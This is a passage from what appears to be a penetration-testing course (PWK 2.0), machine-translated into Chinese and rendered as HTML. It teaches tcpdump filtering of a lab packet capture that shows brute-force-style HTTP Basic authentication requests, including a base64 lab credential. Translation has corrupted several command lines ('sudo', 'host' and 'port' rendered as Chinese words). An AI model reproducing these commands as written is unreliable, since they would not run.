<div style="position:absolute;top:120085;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:120085;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">101</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:119104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们也可以安全地假设客户端地址向服务器发出了许多请求，但是</font></font></nobr></div>
<div style="position:absolute;top:119123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了在没有太多假设的情况下继续进行，我们可以使用过滤器来更多地检查流量</font></font></nobr></div>
<div style="position:absolute;top:119142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密切。</font></font></nobr></div>
<div style="position:absolute;top:119175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了从命令行进行过滤，我们将使用源主机（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">src host</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）和目标</font></font></nobr></div>
<div style="position:absolute;top:119195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">host ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dst host</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 过滤器分别只输出源和目标流量。</font><font style="vertical-align: inherit;">我们也可以过滤</font></font></nobr></div>
<div style="position:absolute;top:119214;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过端口号 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-n port 81</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 显示针对端口 81 的源和目标流量。让我们尝试</font></font></nobr></div>
<div style="position:absolute;top:119233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在这些过滤器：</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:119268;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">须藤 tcpdump -n src 主机 172.16.40.10 -r password_cracking_filtered.pcap</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:119285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:119302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">08:51:20.801051 IP 172.16.40.10.81 &gt; 208.68.234.99.60509：标志 [S.]，seq 4166855389，</font></font></nobr></div>
<div style="position:absolute;top:119319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,w</font></font></nobr></div>
<div style="position:absolute;top:119336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">比例尺 4]，长度为 0</font></font></nobr></div>
<div style="position:absolute;top:119353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">08:51:20.802053 IP 172.16.40.10.81 &gt; 208.68.234.99.60509：Flags [.]，ack 89，win 905，</font></font></nobr></div>
<div style="position:absolute;top:119370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项 [nop,nop,TS val 71430591 ecr 25538253]，长度 0</font></font></nobr></div>
<div style="position:absolute;top:119387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:119404;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">须藤 tcpdump -n dst 主机 172.16.40.10 -r password_cracking_filtered.pcap</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:119421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:119438;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">08:51:20.801048 IP 208.68.234.99.60509 &gt; 172.16.40.10.81：标志 [S]，seq 1855084074，w</font></font></nobr></div>
<div style="position:absolute;top:119455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 14600 中，选项 [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7]，长度 0</font></font></nobr></div>
<div style="position:absolute;top:119472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">08:51:20.802026 IP 208.68.234.99.60509 &gt; 172.16.40.10.81：标志 [.]，确认 4166855390，w</font></font></nobr></div>
<div style="position:absolute;top:119489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 115 中，选项 [nop,nop,TS val 25538253 ecr 71430591]，长度 0</font></font></nobr></div>
<div style="position:absolute;top:119506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:119523;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">须藤 tcpdump -n 端口 81 -r password_cracking_filtered.pcap</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:119540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:119557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">08:51:20.800917 IP 208.68.234.99.60509 &gt; 172.16.40.10.81：标志 [S]，seq 1855084074，w</font></font></nobr></div>
<div style="position:absolute;top:119574;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 14600 中，选项 [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7]，长度 0</font></font></nobr></div>
<div style="position:absolute;top:119591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">08:51:20.800953 IP 172.16.40.10.81 &gt; 208.68.234.99.60509：标志 [S.]，seq 4166855389，</font></font></nobr></div>
<div style="position:absolute;top:119608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,w</font></font></nobr></div>
<div style="position:absolute;top:119625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">比例尺 4]，长度为 0</font></font></nobr></div>
<div style="position:absolute;top:119642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:119661;left:361"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 129 - 使用 tcpdump 过滤器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:119690;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以继续使用各种命令行实用程序（如 awk 和</font></font></nobr></div>
<div style="position:absolute;top:119710;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep，但让我们继续深入检查一些数据包，看看是什么样的</font></font></nobr></div>
<div style="position:absolute;top:119729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以发现的细节。</font></font></nobr></div>
<div style="position:absolute;top:119762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要转储捕获的流量，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-X</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项以 HEX 和</font></font></nobr></div>
<div style="position:absolute;top:119781;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ASCII </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">108</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:119816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo tcpdump -nX -r password_cracking_filtered.pcap</font></font></font></b></nobr></div>
<div style="position:absolute;top:119833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:119850;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">08:51:25.043062 IP 208.68.234.99.33313 &gt; 172.16.40.10.81：标志 [P.]，seq 1:140，ack 1</font></font></nobr></div>
<div style="position:absolute;top:119867;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x0000: 4500 00bf 158c 4000 3906 9cea d044 ea63 E.....@.9....DC</font></font></nobr></div>
<div style="position:absolute;top:119884;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x0010: ac10 280a 8221 0051 a726 a77c 6fd8 ee8a ..(..!.Q.&amp;.|o...</font></font></nobr></div>
<div style="position:absolute;top:119901;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x0020: 8018 0073 1c76 0000 0101 080a 0185 b2f2 ...sv ........</font></font></nobr></div>
<div style="position:absolute;top:119918;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x0030: 0441 f5e3 4745 5420 2f2f 6164 6d69 6e20 .A..GET.//admin.</font></font></nobr></div>
<div style="position:absolute;top:119935;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x0040: 4854 5450 2f31 2e31 0d0a 486f 7374 3a20 HTTP/1.1..Host:.</font></font></nobr></div>
<div style="position:absolute;top:119952;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x0050：6164 6d69 6e2e 6d65 6761 636f 7270 6f6e admin.megacorpon</font></font></nobr></div>
<div style="position:absolute;top:119969;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x0060: 652e 636f 6d3a 3831 0d0a 5573 6572 2d41 e.com:81..User-A</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:120035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">108 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/ASCII</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:120163;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="102"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 102 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:120196;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:121273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:121273;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:121273;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">102</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:120292;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x0070: 6765 6e74 3a20 5465 6820 466f 7265 7374 gent:.Teh.Forest</font></font></nobr></div>
<div style="position:absolute;top:120308;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x0080：204c 6f62 7374 6572 0d0a 4175 7468 6f72 .Lobster..作者</font></font></nobr></div>
<div style="position:absolute;top:120325;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x0090：697a 6174 696f 6e3a 2042 6173 6963 2059 化：.Basic.Y</font></font></nobr></div>
<div style="position:absolute;top:120342;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x00a0：5752 7461 5734 3662 6d46 7562 3352 6c59 WRtaW46bmFub3RlY</font></font></nobr></div>
<div style="position:absolute;top:120360;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x00b0: 3268 7562 3278 765a 336b 780d 0a0d 0a 2hub2xvZ3kx ....</font></font></nobr></div>
<div style="position:absolute;top:120376;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:120396;left:246"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 130 - 使用 tcpdump 读取 hex/ascii 输出中的数据包捕获</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:120425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们立即注意到端口 81 上到 172.16.40.10 的流量看起来像 HTTP 数据。</font><font style="vertical-align: inherit;">事实上，它</font></font></nobr></div>
<div style="position:absolute;top:120444;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">似乎这些 HTTP 请求包含基本的 HTTP 身份验证数据，用户代理“Teh</font></font></nobr></div>
<div style="position:absolute;top:120464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">森林龙虾”。</font><font style="vertical-align: inherit;">这是一个非常明显的迹象，表明正在发生一些奇怪的事情。</font></font></nobr></div>
<div style="position:absolute;top:120497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了揭开其余的谜团，我们将需要依靠高级标题过滤。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:120531;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.5.3 高级头过滤</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:120569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此时，为了更好地检查转储中的请求和响应，我们想过滤掉</font></font></nobr></div>
<div style="position:absolute;top:120588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且只显示数据包。</font><font style="vertical-align: inherit;">为此，我们将查找具有</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PSH</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font><i><font style="vertical-align: inherit;">ACK 的</font></i><font style="vertical-align: inherit;">数据包</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:120608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志打开。</font><font style="vertical-align: inherit;">在初始 3 次握手后发送和接收的所有数据包都将具有</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ACK</font></font></i></nobr></div>
<div style="position:absolute;top:120627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志设置。</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PSH</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">109</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于强制的数据包的立即传送，通常用于</font></font></nobr></div>
<div style="position:absolute;top:120646;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在交互式</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用层</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">协议中以避免缓冲。</font></font></nobr></div>
<div style="position:absolute;top:120679;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下图描绘了 TCP 标头，并显示了 TCP 标志的定义开始</font></font></nobr></div>
<div style="position:absolute;top:120699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从第 14 个字节开始。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:120990;left:293"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 16：TCP 数据包在第 14 个字节中显示标志</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:121022;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">看图 16，我们可以看到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ACK</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PSH</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由第四位和第五位表示</font></font></nobr></div>
<div style="position:absolute;top:121041;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 14 个字节，分别为：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:121076;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CEUAPRSF</font></font></nobr></div>
<div style="position:absolute;top:121093;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WCRCSSYI</font></font></nobr></div>
<div style="position:absolute;top:121109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">REGKHTNN</font></font></nobr></div>
<div style="position:absolute;top:121126;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00011000 = 24 十进制</font></font></nobr></div>
<div style="position:absolute;top:121146;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 131 - 计算所需的位</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:121223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">109 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（DARPA Inernet 计划，1981），https://tools.ietf.org/html/rfc793</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:121351;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="103"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 103 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:121384;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:122461;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:122461;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:122461;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">103</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:121480;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只打开这些位会给我们</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00011000</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，或十进制 24。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:121514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "$((2#00011000))"</font></font></font></b></nobr></div>
<div style="position:absolute;top:121532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24</font></font></nobr></div>
<div style="position:absolute;top:121551;left:295"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 132 - 在 bash 中将二进制位转换为十进制</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:121580;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以将此数字传递给 tcpdump 并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'tcp[13] = 24'</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为显示过滤器，以表明我们</font></font></nobr></div>
<div style="position:absolute;top:121600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只想看到设置了 ACK 和 PSH 位的数据包（“数据数据包”），如</font></font></nobr></div>
<div style="position:absolute;top:121619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 报头的第 14 字节的</font><font style="vertical-align: inherit;">第四和第五位（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font><font style="vertical-align: inherit;">请记住，tcpdump 数组索引</font></font></nobr></div>
<div style="position:absolute;top:121639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于计算从零开始的字节数，因此语法应该是 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcp[13]</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )。</font></font></nobr></div>
<div style="position:absolute;top:121671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这两个标志的组合有望仅向我们显示 HTTP 请求和响应</font></font></nobr></div>
<div style="position:absolute;top:121691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据。</font><font style="vertical-align: inherit;">这是我们将用来显示设置了 ACK 或 PSH 标志的数据包的命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:121725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap</font></font></font></b></nobr></div>
<div style="position:absolute;top:121743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">06:51:20.802032 IP 208.68.234.99.60509 &gt; 172.16.40.10.81：标志 [P.]，seq 1855084075:1</font></font></nobr></div>
<div style="position:absolute;top:121760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">E.....@.9....DC.(</font></font></nobr></div>
<div style="position:absolute;top:121777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.].Qn.V+.]*....s1......</font></font></nobr></div>
<div style="position:absolute;top:121793;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.....A..GET //admin HTTP/1.1</font></font></nobr></div>
<div style="position:absolute;top:121810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主持人：admin.megacorpone.com:81</font></font></nobr></div>
<div style="position:absolute;top:121827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户代理：Teh Forest Lobster</font></font></nobr></div>
<div style="position:absolute;top:121861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:121878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">E.....@.@...(</font></font></nobr></div>
<div style="position:absolute;top:121895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.DcQ^...E..？我.......</font></font></nobr></div>
<div style="position:absolute;top:121912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.A......HTTP/1.1 401 需要授权</font></font></nobr></div>
<div style="position:absolute;top:121929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日期：2013 年 4 月 22 日星期一 12:51:20 GMT</font></font></nobr></div>
<div style="position:absolute;top:121946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器：Apache/2.2.20 (Ubuntu)</font></font></nobr></div>
<div style="position:absolute;top:121963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WWW-Authenticate: Basic realm="密码保护区"</font></font></nobr></div>
<div style="position:absolute;top:121980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变化：接受编码</font></font></nobr></div>
<div style="position:absolute;top:121997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容长度：488</font></font></nobr></div>
<div style="position:absolute;top:122014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容类型：文本/html；</font><font style="vertical-align: inherit;">字符集=iso-8859-1</font></font></nobr></div>
<div style="position:absolute;top:122048;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</font></font></nobr></div>
<div style="position:absolute;top:122065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;html&gt;&lt;头&gt;</font></font></nobr></div>
<div style="position:absolute;top:122082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;title&gt;需要 401 授权&lt;/title&gt;</font></font></nobr></div>
<div style="position:absolute;top:122099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/head&gt;&lt;body&gt;</font></font></nobr></div>
<div style="position:absolute;top:122116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;h1&gt;需要授权&lt;/h1&gt;</font></font></nobr></div>
<div style="position:absolute;top:122133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;p&gt;此服务器无法验证您</font></font></nobr></div>
<div style="position:absolute;top:122150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被授权访问文档</font></font></nobr></div>
<div style="position:absolute;top:122167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要求。</font><font style="vertical-align: inherit;">要么你提供了错误的</font></font></nobr></div>
<div style="position:absolute;top:122184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">凭据（例如，错误的密码），或您的</font></font></nobr></div>
<div style="position:absolute;top:122201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">浏览器不明白如何提供</font></font></nobr></div>
<div style="position:absolute;top:122218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所需的凭据。&lt;/p&gt;</font></font></nobr></div>
<div style="position:absolute;top:122235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;小时&gt;</font></font></nobr></div>
<div style="position:absolute;top:122252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;address&gt;Apache/2.2.20 (Ubuntu) 服务器在 admin.megacorpone.com 端口 81&lt;/address&gt;</font></font></nobr></div>
<div style="position:absolute;top:122269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/正文&gt;&lt;/html&gt;</font></font></nobr></div>
<div style="position:absolute;top:122302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:122337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">08:51:25.044432 IP 172.16.40.10.81 &gt; 208.68.234.99.33313：</font></font></nobr></div>
<div style="position:absolute;top:122354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">E..sm@.@..U..(</font></font></nobr></div>
<div style="position:absolute;top:122371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.DcQ!o....&amp;......^u.....</font></font></nobr></div>
<div style="position:absolute;top:122387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.A......HTTP/1.1 </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">301 永久移动</font></font></font></b></nobr></div>
<div style="position:absolute;top:122404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日期：2013 年 4 月 22 日星期一 12:51:25 GMT </font></font></nobr></div>
</span></font>

